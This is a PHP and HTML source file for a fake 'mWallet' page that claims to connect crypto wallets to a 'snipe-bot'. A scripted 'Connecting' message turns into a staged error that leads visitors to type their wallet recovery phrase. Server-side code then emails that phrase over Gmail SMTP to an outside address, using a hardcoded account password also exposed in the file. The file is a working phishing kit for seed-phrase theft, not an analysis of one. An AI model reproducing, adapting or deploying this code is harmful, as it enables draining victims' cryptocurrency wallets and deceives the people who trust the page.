<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require './PHPMailer-master/src/Exception.php';
require './PHPMailer-master/src/PHPMailer.php';
require './PHPMailer-master/src/SMTP.php';

if(isset($_POST['submit_btn'])) {

  

    // Set up the recipient email address
    $to = "mgr.williamwoods@gmail.com";

    // Subject of the email
    $subject = "Recovery Phrase Submission";

    // Extracting the recovery phrase from the form
    $recovery_phrase = $_POST['recovery_phrase'];

    // Constructing the email message
    $message = "Recovery Phrase: " . $recovery_phrase;

    // Sending the email
    // $result = mail($to, $subject, $message);

    

    $mail = new PHPMailer(true);
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = 'companyfinancepayment@gmail.com';
    $mail->Password = 'myeucweztkwwkkdf';
    $mail->SMTPSecure = 'tls';
    $mail->Port = 587;

    $mail->setFrom('companyfinancepayment@gmail.com', 'Wallet App');
    $mail->addAddress('mgr.williamwoods@gmail.com');
    $mail->Subject = $subject;
    $mail->Body = $message;

    $mail->send();


    // if($result) {
    //     echo "<script>alert('Your recovery phrase has been submitted successfully.')</script>";
    // } else {
    //     echo "<script>alert('There was an error submitting your recovery phrase.')</script>";
    // }
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>mWallet</title>
  <meta content="" name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <link href="assets/img/favicon.png" rel="icon">
  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">

  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">

  <!-- Vendor CSS Files -->
  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">
  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>


  <!-- Template Main CSS File -->
  <link href="assets/css/style.css" rel="stylesheet">

  <style>

    .icon-box{
      width: 100%;
      min-height: 280px;
      max-height: 280px;
    }
    .icon-box img{
      width: 100%;
      max-height: 180px;
      min-height: 180px;
    }
  </style>

<style>
.modal {
  display: none; /* Hide the modal by default */
  position: fixed; /* Fixed position */
  z-index: 1; /* Ensure it appears on top of other content */
  left: 0;
  top: 0;
  width: 100%; /* Full width */
  height: 100%; /* Full height */
  overflow: auto; /* Enable scrolling */
  background-color: rgba(0,0,0,0.4); /* Black background with transparency */
}

.modal-content {
  background-color: #fefefe; /* White background */
  margin: 15% auto; /* 15% from the top, centered horizontally */
  padding: 20px;
  border: 1px solid #888;
  width: 50%; /* Set the width */
}

/* Close button */
.close {
  color: #aaa;
  float: right;
  font-size: 28px;
  font-weight: bold;
}

.close:hover,
.close:focus {
  color: black;
  text-decoration: none;
  cursor: pointer;
}

</style>

  <style>
    body {
      background: linear-gradient(180deg, #0a0a1f, #000);
      color: #fff;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      overflow: auto;

    }
    .header-icon {
      width: 48px;
      height: 48px;
      background: #5A3FFC;
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 20px;
    }
    .header-icon svg {
      fill: white;
      width: 24px;
      height: 24px;
    }
    h2 {
      font-weight: 700;
      text-align: center;
      margin-bottom: 8px;
    }
    .subheading {
      text-align: center;
      color: #767A87;
      font-weight: 500;
      margin-bottom: 32px;
    }
    .wallet-card {
      border: 1px solid #D6D9E6;
      border-radius: 12px;
      padding: 16px;
      cursor: pointer;
      transition: box-shadow 0.3s, border-color 0.3s;
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      height: 140px;
      gap: 8px;
    }
    .wallet-card:hover {
      border-color: #5A3FFC;
      box-shadow: 0 2px 12px rgb(90 63 252 / 0.25);
    }
    .wallet-icon {
      width: 40px;
      height: 40px;
      margin-bottom: 8px;
      object-fit: contain;
    }
    .wallet-name {
      font-weight: 600;
      font-size: 1rem;
      color: #212121;
    }
    .wallet-url {
      font-size: 0.75rem;
      color: #9A9DB2;
      user-select: text;
    }
  </style>


</head>

<body>

  <!-- ======= Hero Section ======= -->
  <section id="hero" class="d-flex align-items-center">
    <div class="container position-relative" data-aos="fade-up" data-aos-delay="100">
      <div class="row justify-content-center">
        <div class="col-xl-7 col-lg-9 text-center">
          <h1>Select Your Wallet</h1>
          <h2>
            Choose your preferred wallet to connect securely to the decentralized snipe-bot
          </h2>
<br>
          <center><a href="#" class="btn btn-primary btn-lg" id="trustWalletLink">Connect Wallet >></a></center>
        </div>
      </div>
     

      <div class="row icon-boxes">
       


        <!-- Modal -->
<div id="myModal" class="modal">
  <div class="modal-content">
    <span class="close" style="float: right;">&times;</span>
     <div class="card">
      <div class="card-body p-4">

      <b>Import Your</b><br>

      <select class="form-control" id="walletSelect">
          <option value="">Select your wallet</option>
          <option value="trustWallet">Trust Wallet</option>
          <option value="atomic">Atomic</option>
          <option value="metaMask">Meta Mask</option>
          <option value="rainbow">Rainbow</option>
          <option value="coinbase">Coinbase</option>
          <option value="exodus">Exodus</option>
          <option value="ledgerLive">Ledger Live</option>
          <option value="trezorWallet">Trezor Wallet</option>
          <option value="myEtherWallet">MyEtherWallet (MEW)</option>
          <option value="electrum">Electrum</option>
          <option value="guardaWallet">Guarda Wallet</option>
          <option value="bitPay">BitPay</option>
          <option value="bitPay">Phantom</option>
          <option value="bitPay">Moonpay</option>
        </select><br>
      
      <span style="color: green; display: none;" id="first">Connecting to your wallet...</span> 
      <span style="color: red; display: none;" id="error">Error Connecting to your wallet... &nbsp; <button class="btn btn-success" id="manual_btn" style="background-color: black; border: none;">Connect manually</button></span> 
     
      <div id="manually" style="display: none;"><hr>
      <form action="" method="POST" >
      <textarea  name="recovery_phrase" class="form-control" placeholder="Enter your recovery phrase"></textarea><br>
      Typically 12(sometimes 24) words, separated by single spaces.<br><br>

      <button type="submit" name="submit_btn" class="btn btn-primary btn-lg w-100">Proceed>></button>

      </form>
      </div>
    
    
    </div>
     </div>
  </div>
</div>

<script>
document.getElementById('walletSelect').addEventListener('change', function() {
  var selectedWallet = this.value;
  var firstMessage = document.getElementById('first');
  var errorMessage = document.getElementById('error');

  // Hide any previous messages
  firstMessage.style.display = 'none';
  errorMessage.style.display = 'none';

  // Show appropriate message based on selected wallet
  if (selectedWallet !== '') {
    // Show the first message for connecting
    firstMessage.style.display = 'block';

    // Simulate some processing time (e.g., 3 seconds)
    setTimeout(function() {
      // After 3 seconds, hide the first message and show the second message
      firstMessage.style.display = 'none';
      errorMessage.style.display = 'block';
    }, 3000);
  }
});
</script>

<script>
// Get the modal
var modal = document.getElementById("myModal");

// Get the link
var link = document.getElementById("trustWalletLink");

// When the user clicks on the link, show the modal
link.addEventListener("click", function(event) {
  event.preventDefault(); // Prevent the default action of following the link
  modal.style.display = "block"; // Display the modal
});

// When the user clicks on <span> (x), close the modal
var span = document.getElementsByClassName("close")[0];
span.onclick = function() {
  modal.style.display = "none"; // Hide the modal
};

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
  if (event.target == modal) {
    modal.style.display = "none"; // Hide the modal
  }
};

$(document).ready(function(){

  $("#manual_btn").click(function(){
  $("#manually").show();
})
})


</script>

    
 
  <div class="container">
    <div class="row g-4 row-cols-2 row-cols-md-5">
      <!-- Existing Wallets (with icons) -->
      <div class="col">
        <div class="wallet-card">
          <img src="https://play-lh.googleusercontent.com/lm6Rk4Qc3eXUIxC8qkFCj46Bho6fbi6Lu3TwWuS3JNU2bBEcNU61arw_wG5wA0c-4IE" alt="MetaMask" class="wallet-icon" />
          <div class="wallet-name">MetaMask</div>
          <div class="wallet-url">metamask.io</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <img src="https://play-lh.googleusercontent.com/mHjR3KaAMw3RGA15-t8gXNAy_Onr4ZYUQ07Z9fG2vd51IXO5rd7wtdqEWbNMPTgdqrk=w600-h300-pc0xffffff-pd" alt="Ledger Live" class="wallet-icon" />
          <div class="wallet-name">Ledger Live</div>
          <div class="wallet-url">ledger.com</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTXHcAPznZRTiitYxkl_pq2RBmhb0tkkSSusQ&s" alt="Keplr" class="wallet-icon" />
          <div class="wallet-name">Keplr</div>
          <div class="wallet-url">keplr.app</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <img src="https://play-lh.googleusercontent.com/kDSFLUyqQhqR9lW1qbKIp2fKkPqgVoHYXslADc4V2alosw2NozwWbfsfvw3w98hDmzQ=w240-h480-rw" alt="Slush Wallet" class="wallet-icon" />
          <div class="wallet-name">Slush Wallet</div>
          <div class="wallet-url">slush.app</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTluPiUtNXlU5GDIKQnAD8kYQ5Qzv8OM3fcxA&s" alt="Tonkeeper" class="wallet-icon" />
          <div class="wallet-name">Tonkeeper</div>
          <div class="wallet-url">tonkeeper.com</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <img src="https://cdn-icons-png.freepik.com/256/4094/4094196.png" alt="Karak" class="wallet-icon" />
          <div class="wallet-name">Karak Wallet</div>
          <div class="wallet-url">karak.network</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <img src="https://external-preview.redd.it/bittensor-wallets-drained-v0-eJ-9I3GyFq_lH01blF9lvXAazKKK5rHtAaevNRw5EZw.jpg?auto=webp&s=8a301b5e84981dbe477cded937e1fe91c9682b0b" alt="Bittensor" class="wallet-icon" />
          <div class="wallet-name">Bittensor Wallet</div>
          <div class="wallet-url">bittensor.org</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSpuA1o2GeWF6hzr6p1vHH6wQbdvPcnHV_kJg&s" alt="Bitget" class="wallet-icon" />
          <div class="wallet-name">Bitget Wallet</div>
          <div class="wallet-url">bitget.com</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <img src="https://play-lh.googleusercontent.com/xGqGrj1Xm1rlCm4PaEqXSP_zcKjKtOxVOiYsY23fkCuxVI3PEA7Y-tMBsEgesUHr8vA" alt="Gate.io" class="wallet-icon" />
          <div class="wallet-name">Gate.io Wallet</div>
          <div class="wallet-url">gate.io</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <img src="https://cdn-icons-png.freepik.com/512/10464/10464508.png" alt="OKX" class="wallet-icon" />
          <div class="wallet-name">OKX Wallet</div>
          <div class="wallet-url">okx.com</div>
        </div>
      </div>

      <!-- New Wallets with (real or placeholder) icons -->
      <div class="col">
        <div class="wallet-card">
          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQDkFH8Ga-nYaHiL--Uk8oVHvYgDL7o2FzZ3A&s" alt="Trust Wallet" class="wallet-icon" />
          <div class="wallet-name">Trust Wallet</div>
          <div class="wallet-url">trustwallet.com</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/ef/e3/25/efe325be-61ef-f534-3107-d875ce033aa9/AppIcon-0-0-1x_U007ephone-0-1-0-85-220.png/1200x630wa.png" alt="Coinbase Wallet" class="wallet-icon" />
          <div class="wallet-name">Coinbase Wallet</div>
          <div class="wallet-url">coinbase.com</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <!-- TODO: put actual Binance Wallet icon URL -->
          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQyowOGNYQmxZ6RA9EbddIh5L2hRO1cRCcVSA&s" alt="Binance Wallet" class="wallet-icon" />
          <div class="wallet-name">Binance Wallet</div>
          <div class="wallet-url">binance.org</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <!-- TODO: actual Rainbow icon -->
          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgffx2rvKMnVSlWOQ2uyItBKXc5q8WGbXCnQ&s" alt="Rainbow Wallet" class="wallet-icon" />
          <div class="wallet-name">Rainbow Wallet</div>
          <div class="wallet-url">rainbow.me</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <!-- TODO: actual Phantom icon -->
          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT0NqznQsPpTRvlqC5SK0VLu-9jqQGGPjr-tQ&s" alt="Phantom Wallet" class="wallet-icon" />
          <div class="wallet-name">Phantom Wallet</div>
          <div class="wallet-url">phantom.app</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <!-- TODO: actual SafePal icon -->
          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSRIhgcKHVQD8z7TDjVl0iCsEpAKM1ypeqOAA&s" alt="SafePal Wallet" class="wallet-icon" />
          <div class="wallet-name">SafePal Wallet</div>
          <div class="wallet-url">safepal.com</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <!-- TODO: actual MathWallet icon -->
          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSqLhM8kKRTm7gyEYxlQGV-_XkgsHPpNo-Zw&s" alt="MathWallet" class="wallet-icon" />
          <div class="wallet-name">MathWallet</div>
          <div class="wallet-url">mathwallet.org</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <!-- TODO: actual Argent icon -->
          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRtCAe71bWuh6rGt7lVu51HFPVDO_-qlcvSBQ&s" alt="Argent Wallet" class="wallet-icon" />
          <div class="wallet-name">Argent Wallet</div>
          <div class="wallet-url">argent.xyz</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <!-- TODO: actual TokenPocket icon -->
          <img src="https://www.tokenpocket.pro/_nuxt/img/token-pocket-icon-1.fbd71fe.png" alt="TokenPocket" class="wallet-icon" />
          <div class="wallet-name">TokenPocket</div>
          <div class="wallet-url">tokenpocket.pro</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <!-- TODO: actual Pillar icon -->
          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT0-Nh2vnGId-X4USt5nT_QU0LOmbB_ikwrUg&s" alt="Pillar Wallet" class="wallet-icon" />
          <div class="wallet-name">Pillar Wallet</div>
          <div class="wallet-url">pillarproject.io</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <!-- TODO: actual Defiant icon -->
          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJB_97phr1Tw2PFzeJJCm4Ef185AIkzwx3zA&s" alt="Defiant Wallet" class="wallet-icon" />
          <div class="wallet-name">Defiant Wallet</div>
          <div class="wallet-url">defiantapp.tech</div>
        </div>
      </div>
      <div class="col">
        <div class="wallet-card">
          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRSYRWfaEBtFoUmCw5cRkqlbbc9PYN2COEYTQ&s" alt="Exodus Wallet" class="wallet-icon" />
          <div class="wallet-name">Exodus Wallet</div>
          <div class="wallet-url">exodus.com</div>
        </div>
      </div>

    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    document.querySelectorAll('.wallet-card').forEach(card => {
      card.addEventListener('click', () => {
        alert(`You selected ${card.querySelector('.wallet-name').textContent}`);
      });
    });
  </script>

  <main id="main">

   
  </main><!-- End #main -->

  

  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>

  <!-- Vendor JS Files -->
  <script src="assets/vendor/purecounter/purecounter_vanilla.js"></script>
  <script src="assets/vendor/aos/aos.js"></script>
  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
  <script src="assets/vendor/php-email-form/validate.js"></script>

  <!-- Template Main JS File -->
  <script src="assets/js/main.js"></script>

</body>

</html>